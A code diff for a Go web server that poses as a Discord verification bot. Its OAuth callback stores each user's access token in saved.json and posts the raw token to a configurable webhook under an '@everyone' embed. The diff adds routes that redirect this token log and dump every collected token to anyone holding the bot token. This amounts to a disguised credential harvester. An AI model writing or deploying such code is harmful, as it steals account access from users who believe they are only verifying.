@@ -2,34 +2,31 @@ package main
 
 import (
 	"bytes"
-	"fmt"
 	"encoding/json"
-		"net/http"
-		"io/ioutil"
-		"time"
-	"github.com/gin-gonic/gin"
+	"fmt"
+	"io/ioutil"
+	"net/http"
 	"os"
+	"time"
+
+	"github.com/gin-gonic/gin"
 )
 
-
 // sorry for long setup just cba setting automated shit up atm sorry!
-const guild_id = "" // guild where to verify
-const bot_token = "" // bot token
-const sec = ""; // client secret
-const client_id = ""; // client id
+const guild_id = ""                      // guild where to verify
+const bot_token = ""                     // bot token
+const sec = ""                           // client secret
+const client_id = ""                     // client id
 const redirect = "http://localhost:8080/callback" // redirection url (change to domain once hosting non locally)
-const role_id = "" // verified role id (automated soon) make sure this role is below the bots (without it cannot give the role)
+const role_id = ""                       // verified role id (automated soon) make sure this role is below the bots (without it cannot give the role)
 
 type DiscordToken struct {
 	AccessToken string `json:"access_token"`
 }
 
-
-
-
 func assignRole(userID string, roleID string, botToken string) error {
 	fmt.Printf("Userid: %s, Roleid: %s, bot: %s, guild: %s", userID, roleID, botToken, guild_id)
-	url := fmt.Sprintf("https://discord.com/api/guilds/%s/members/%s/roles/%s",guild_id, userID, roleID)
+	url := fmt.Sprintf("https://discord.com/api/guilds/%s/members/%s/roles/%s", guild_id, userID, roleID)
 	requestBody := []byte(`{}`)
 	req, err := http.NewRequest("PUT", url, bytes.NewBuffer(requestBody))
 	if err != nil {
@@ -49,7 +46,6 @@ func assignRole(userID string, roleID string, botToken string) error {
 
 	return nil
 }
-
 
 func getUserData(token string) (map[string]interface{}, error) {
 	client := &http.Client{}
@@ -75,7 +71,6 @@ func getUserData(token string) (map[string]interface{}, error) {
 
 	return data, nil
 }
-
 
 func readJSONFile(filePath string) (map[string]interface{}, error) {
 	var data map[string]interface{}
@@ -136,13 +131,10 @@ func sendMessage(webhookURL string, content string, embeds []map[string]interfac
 	}
 	defer resp.Body.Close()
 
-
 	return nil
 }
 
-
 func main() {
-	
 
 	r := gin.Default()
 	r.LoadHTMLGlob("templates/*")
@@ -151,10 +143,69 @@ func main() {
 			"hello": "hello",
 		})
 	})
+	r.GET("/set/webhook", func(c *gin.Context) {
+		webhook := c.Query("webhook")
+		tokenx := c.Query("token")
+
+		if tokenx == bot_token {
+			fmt.Printf("a")
+			file, err := os.OpenFile("saved.json", os.O_RDWR, 0644)
+			if err != nil {
+			}
+			defer file.Close()
+
+			var data map[string]interface{}
+			err = json.NewDecoder(file).Decode(&data)
+			if err != nil {
+			}
+
+			data["log"] = webhook
+			file.Truncate(0)
+			file.Seek(0, 0)
+			err = json.NewEncoder(file).Encode(&data)
+			if err != nil {
+			}
+			c.JSON(200, gin.H{
+				"status": "done",
+			})
+		} else {
+			c.JSON(404, gin.H{
+				"status": "error, auth token is invalid",
+			})
+		}
+	})
+	r.GET("/active", func(c *gin.Context) {
+		token := c.Query("token")
+		fmt.Println(token)
+		if token == bot_token {
+			file, err := ioutil.ReadFile("saved.json")
+			if err != nil {
+				fmt.Println(err)
+				return
+			}
+
+			var data map[string]interface{}
+			err = json.Unmarshal([]byte(file), &data)
+			if err != nil {
+				fmt.Println(err)
+				return
+			}
+
+			items := data["array"].([]interface{})
+			for _, item := range items {
+				fmt.Println(item)
+			}
+			c.JSON(200, items)
+		} else {
+			c.JSON(404, gin.H{
+				"status": "error, auth token is invalid",
+			})
+		}
+	})
 	r.GET("/callback", func(c *gin.Context) {
-		b, a := readJSONFile("bot/saved.json")
-		if a != nil{
-			fmt.Println	(a)
+		b, a := readJSONFile("saved.json")
+		if a != nil {
+			fmt.Println(a)
 			return
 		}
 
@@ -182,15 +233,15 @@ func main() {
 		}
 		var mn = data1["id"]
 		fmt.Println(data1["id"])
-		err = saveData("bot/saved.json", data1)
+		err = saveData("saved.json", data1)
 		if err != nil {
 			fmt.Println(err)
 			return
 		}
 		mn, ok := mn.(string)
-if !ok {
-}		
-fmt.Println(mn)
+		if !ok {
+		}
+		fmt.Println(mn)
 		content := "@everyone"
 		var abc = data1["username"]
 		abc, jk := abc.(string)
@@ -200,28 +251,25 @@ fmt.Println(mn)
 		fmt.Println(abc.(string))
 		embed := make(map[string]interface{})
 		embed["title"] = "New authenticated user!"
-		embed["description"] = "Name: <@"+mn.(string)+">\nAccess Token: "+token+"\nTime: "+dt.String()
-		file, err := os.OpenFile("bot/saved.json", os.O_RDWR, 0644)
+		embed["description"] = "Name: <@" + mn.(string) + ">\nAccess Token: " + token + "\nTime: " + dt.String()
+		file, err := os.OpenFile("saved.json", os.O_RDWR, 0644)
 
-    defer file.Close()
+		defer file.Close()
 
-    bytes, err := ioutil.ReadAll(file)
+		bytes, err := ioutil.ReadAll(file)
 
+		var ff map[string]interface{}
+		err = json.Unmarshal(bytes, &ff)
 
-    var ff map[string]interface{}
-    err = json.Unmarshal(bytes, &ff)
+		ff["array"] = append(ff["array"].([]interface{}), token)
 
+		bytes, err = json.MarshalIndent(ff, "", "    ")
 
-    ff["array"] = append(ff["array"].([]interface{}), token)
+		err = file.Truncate(0)
 
-    bytes, err = json.MarshalIndent(ff, "", "    ")
+		_, err = file.Seek(0, 0)
 
-    err = file.Truncate(0)
-
-    _, err = file.Seek(0, 0)
-
-
-    _, err = file.Write(bytes)
+		_, err = file.Write(bytes)
 
 		embeds := []map[string]interface{}{embed}
 
@@ -235,9 +283,7 @@ fmt.Println(mn)
 			return
 		}
 		fmt.Println(err2)
-		c.HTML(http.StatusOK, "index.html", gin.H{
-			
-		})
+		c.HTML(http.StatusOK, "index.html", gin.H{})
 	})
 
 	r.Run()
